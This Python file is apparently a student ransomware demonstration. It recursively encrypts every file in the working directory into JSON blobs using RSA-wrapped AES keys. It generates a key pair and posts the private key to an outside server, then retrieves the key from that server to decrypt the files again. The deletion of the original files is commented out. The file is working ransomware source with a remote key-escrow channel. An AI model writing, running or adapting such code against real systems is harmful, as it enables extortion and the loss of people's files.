import os
import json
import requests
import base64
# Import methods from other files 
from fileEncryptMAC import MyencryptMAC, MydecryptMAC, MyFileEncryptMAC, MyFileDecryptMAC
from fileEncryptRSA import MyRSAencrypt, MyRSAdecrypt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import padding as textPadding
from ransomeMethods import infection, vaccine

# 1. Method that works as a Virus and INFECT the certain working directory 
def infection(dir_path, pub_key):
    for root, dirs, files in os.walk(dir_path):
        for filename in files:
            if "ransomeware.py" not in files and "public.pem" not in files and "private.pem" not in files and "_pycache_" not in files: 
                file_path = root + "/"+filename
                # Encryption method 
                (RSACipher, C, IV, ext, tag) = MyRSAencrypt(file_path, pub_key )
                
                fileName=os.path.splitext(file_path)[0] +".json"    
                # Encoding using base 64 and decode with ascii and store it in a dictionary to dump it and write into ecrypted file 
                data = {'RSACipher':base64.b64encode(RSACipher).decode('ascii'),
                          'C':base64.b64encode(C).decode('ascii'),
                          'IV':base64.b64encode(IV).decode('ascii'),
                          'tag':base64.b64encode(tag).decode('ascii'),
                          'ext':ext } #make dict for json

                # writing the data to encrypted file 
                with open(fileName, 'w') as outfile: #Writes to json 
                    outfile.write(json.dumps(data)) # write the dumped dictionary to file 
                    outfile.close()
                    #os.remove(file_path) # remove all the file after encrypting it 

# 2. Method that works as a Vaccine and DECRYPT all the .JSON files in that current working directory
def vaccine(dir_path, priv_key):
    for root, dirs, files in os.walk(dir_path):
        for filename in files:
            if filename.endswith(".json") and not filename.startswith('.'):
                jsonPath = root + "/" + filename
                # Reading the .JSON file 
                with open(jsonPath, 'r') as file:
                    json_data = file.read()
                # load the data (RSACipher, ...) from the file    
                json_obj = json.loads(json_data)
                # Decoding each object with base 64 and then encode with ascii ( opposite with virus)
                RSACipher   = base64.b64decode(json_obj["RSACipher"].encode('ascii'))       
                C = base64.b64decode(json_obj["C"].encode('ascii')) 
                tag = base64.b64decode(json_obj["tag"].encode('ascii')) 
                IV  = base64.b64decode(json_obj["IV"].encode('ascii')) 
                ext = json_obj["ext"]
 
                # decrypting the file 
                plain_text = MyRSAdecrypt (filename,RSACipher, C, IV, ext, priv_key, tag)
                name = os.path.splitext(root+"/"+filename)[0] + ext
                # Write the original message into the original file with original extension 
                with open(name, 'wb') as outfile: #Writes to json
                    outfile.write(plain_text)
                    outfile.close()
                    os.remove(jsonPath)

# 3. Key Generation - Method to create a pair of Public and Private key and post it to server 
def generateKeyPair():
    keyPairs = []
    filePath = os.getcwd()
    for files in os.listdir(filePath):
        # If there is one already, don't create another 
        if files.lower().endswith(".pem"):
            keyPairs.append(files)
    if len(keyPairs) > 0:
        for i in range(len(keyPairs)):
            keyPair = open(keyPairs[i], "r")
            headline = keyPair.read()
            keyPair.close()
            if "PUBLIC" in headline:
                publicKey_path = filePath + "/" + keyPairs[i]
    else:
        privKey = rsa.generate_private_key(
            public_exponent=65537, 
            key_size=2048, 
            backend=default_backend()
        )
        pubKey = privKey.public_key()
        privateKey_pem=privKey.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        publicKey_pem=pubKey.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        # Writing the public key as a file .PEM
        public_pem=open('public.pem', 'wb')
        public_pem.write(publicKey_pem)
        public_pem.close()
        # Encode byes and decode ascii of both public and private key
        privateKey = base64.encodebytes(privateKey_pem).decode('ascii')
        publicKey = base64.encodebytes(publicKey_pem).decode('ascii')
        # Replace next line with a star
        privateKey = privateKey.replace("\n", "*")
        publicKey = publicKey.replace("\n", "*")
        # Posting to the server 
        url = 'https://www.xyzsecure.me'
        # this is the request to post up 
        request = url + '/keypair'
        # creating an app key called 'xyzSecurity' 
        headers = {'appkey': 'xyzSecurity'}
        keyInformation = {'privatekey': privateKey, 'publickey': publicKey}
        # sending the key pairs to servers and its information using POST
        print("Sending private and public keys to server .......")
        response = requests.post(request, headers = headers, data = keyInformation)
        # Printing out the response to check if it sends, should be in the controller 
        print(response.json())
        # Returning a public key path to get the private path from server 
        publicKey_path = filePath + "\public.pem"        
    return publicKey_path


def getprivate_path(dirt, publicPath):
    pubKey_file = open(publicPath, 'rb')
    print("Retrieving keys..")
    publicKey = pubKey_file.read()
    publicKey = base64.encodebytes(publicKey).decode('ascii')
    publicKey = publicKey.replace("\n", "*")
    headers = {'publickey': publicKey, 'appkey': 'xyzSecurity'}
    url = 'https://xyzsecure.me'
    request = url + '/private'
    response = requests.get(request, headers = headers)
    
    privateKeyJson = response.json()
    privateKey=privateKeyJson['privatekey'].replace('*', '\n')

    privKey_decoded = base64.decodebytes(privateKey.encode('ascii'))

    privKey_file = open('private.pem', 'wb')
    privKey_file.write(privKey_decoded)
    privKey_file.close()
    private_path = dirt +'\private.pem'
    return private_path
# Main program 
def main():
    # Encrypting 
    publicPath = generateKeyPair()
    path_current=os.getcwd()# getting the current working directory
    print("Encrypting ...")
    infection(path_current, publicPath)
    x = input("Continue to undo the Virus")
    # Decrypting 
    privatePath = getprivate_path(path_current, publicPath)
    print(privatePath)
    print("Decrypting ....")
    vaccine(path_current, privatePath)
    os.remove(publicPath)
    os.remove(privatePath)
    
main()
